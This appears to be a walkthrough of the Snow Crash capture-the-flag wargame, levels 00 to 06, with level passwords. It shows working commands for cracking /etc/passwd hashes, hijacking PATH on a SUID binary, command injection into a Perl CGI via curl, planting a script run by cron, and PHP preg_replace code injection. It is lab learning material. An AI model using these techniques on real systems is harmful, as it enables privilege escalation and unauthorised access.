# snow_crash

## Connection

Pour se connecter, il suffit de faire `ssh level00@192.168.1.30` (Note : Faire attention l'ip peut changer) password : `level00`

## Level 00

First one, we find the file of the user `flag00` is the owner.
After that we `cat` one of the file. 
```bash
level00@SnowCrash:~$ cat $(find / -user flag00 2> /dev/null)
```

We found this inside `cdiiddwpgswtgt`.
After multiple test we can translate this using [rot13](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,11)&input=Y2RpaWRkd3Bnc3d0Z3Q).
After this we found the answer is `nottoohardhere`.

After that we have to log with `flag00` and give the password `nottoohardhere`.
When we are connected we just have to use `getflag`.

When we got the flag we have to connect to the next level.

## Level 01
Look at the file we found in the previous level.
Yes the name of the file is **john**. Let use [John the ripper](https://fr.wikipedia.org/wiki/John_the_Ripper).

```bash
level01@SnowCrash:~$ cat /etc/passwd | grep flag01
```

Install [John](https://www.openwall.com/john/) on your computer and give it the result of the previous command.

After copy the file execute `john`. In my case i'm using [kali](https://www.kali.org/). 
```bash
kali@kali:~$ john --wordlist passwd
kali@kali:~$ john --show passwd
```
After the second command you should have this result.
```bash
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
1 password hash cracked, 0 left
```

After that we have to log with `flag01` and give the password `abcdefg`.
When we are connected we just have to use `getflag`.

When we got the flag we have to connect to the next level.

## Level02

At the start of the level we can see a file `level02.pcap`.

```bash
level02@SnowCrash:~$ ls
level02.pcap
```

But what is a .pcap file? [Answer](https://www.solarwinds.com/resources/it-glossary/pcap).

Let's copy the file.
```bash
scp -P 4242 level02@192.168.1.30:~/level02.pcap ~/Desktop
```
*PS : [scp command](https://www.delafond.org/traducmanfr/man/man1/scp.1.html)*

But if you got the error `Permission denied`.
You just have to add right.
```bash
chmod 666 level02.pcap
```

Now we gonna used [tshark](https://www.wireshark.org/docs/man-pages/tshark.html)

After that we can use this command. Or you can use the software [Wireshark](https://www.wireshark.org/)

```bash
tshark -q -r level02.pcap -z follow,tcp,hex,0
```

```bash
000000B9  66                                                f
000000BA  74                                                t
000000BB  5f                                                _
000000BC  77                                                w
000000BD  61                                                a
000000BE  6e                                                n
000000BF  64                                                d
000000C0  72                                                r
000000C1  7f                                                .
000000C2  7f                                                .
000000C3  7f                                                .
000000C4  4e                                                N
000000C5  44                                                D
000000C6  52                                                R
000000C7  65                                                e
000000C8  6c                                                l
000000C9  7f                                                .
000000CA  4c                                                L
000000CB  30                                                0
000000CC  4c                                                L
000000CD  0d                                                .
===================================================================
```

When we look in `man ascii` the `7f` represent `DEL`.
After removing letter we have `ft_waNDReL0L`.

After that we have to log with `flag02` and give the password `ft_waNDReL0L`.
When we are connected we just have to use `getflag`.

When we got the flag we have to connect to the next level.

## Level03

At the start of the level we can see a file `level03`.

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
```

As we can see the file as a specific letter `s` in the permission. 
The `s` permission means [SUID](https://en.wikipedia.org/wiki/Setuid), the file is executed with the user owner's permission, the owner is flag03.

As we can see after running the binary the following message is `Exploit me`.

For that we gonna used [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html)

```bash
level03@SnowCrash:~$ ltrace level03
Can't execute `level03': No such file or directory
PTRACE_SETOPTIONS: No such process
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                   = 2003
geteuid()                                                   = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)         = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)         = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                      = 0
+++ exited (status 0) +++
```

As we can see, there is a system call with `/usr/bin/env` of the echo file. We have to modify our PATH env to run the program.

```bash
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo && chmod 755 /tmp/echo && export PATH=/tmp/:$PATH && ./level03
```
After that we have to log with `level04` and give the password `qi0maab88jeaj46qoumi7maus`.


## Level 04

We can see level04 a `level04.pl` file in our home directory.

```bash
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

When we `cat level04.pl` file, we can see a webserver running in localhost:4747 address.
We can confirm the server running with this command :
```bash
level04@SnowCrash:~$ netstat -tunl | grep 4747
tcp6       0      0 :::4747                 :::*                    LISTEN
```

As we can see the file content param `x`.
As the website run command, we can write the following command to get the flag. The pipe is added to execute the getflag command.
```bash
level04@SnowCrash:~$ curl '192.168.1.30:4747/?x=`getflag`'
```
After that we have to log with `level05` and give the password `ne2searoevaevoem4ov4ar8ap`.

## Level05

When we connect for the first time with the user `level05` we got this : 
```bash
level05@192.168.1.30's password:
You have new mail.
level05@SnowCrash:~$
```
To find the new mail you just have to check your env.
```bash
level05@SnowCrash:~$ env | grep MAIL
MAIL=/var/mail/level05
level05@SnowCrash:~$ ls -l $MAIL
-rw-r--r--+ 1 root mail 58 Jan 25 22:34 /var/mail/level05
level05@SnowCrash:~$ cat $MAIL
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

After looking on internet we see that openarenaserver is a game taking configuration file.

We just have to create a conf file and wait for execute.

Let's create a file `/opt/openarenaserver/exploit`
```vim
/bin/getflag > /tmp/soluce/flag05
```

After that we have to log with `level06` and give the password `viuaaale9huek52boumoomioc`.

## Level06

We can see the following in level06 home. There is a PHP file.

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$
```

How to exec a bin with php. [Doc](https://unix.stackexchange.com/questions/622412/arguments-limit-php-exec-to-bash-script)

```bash
level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > $HOME/execFlag
level06@SnowCrash:~$ ./level06 $HOME/execFlag
```

After that we have to log with `level07` and give the password `wiok45aaoguiboiki2tuin6ub`.
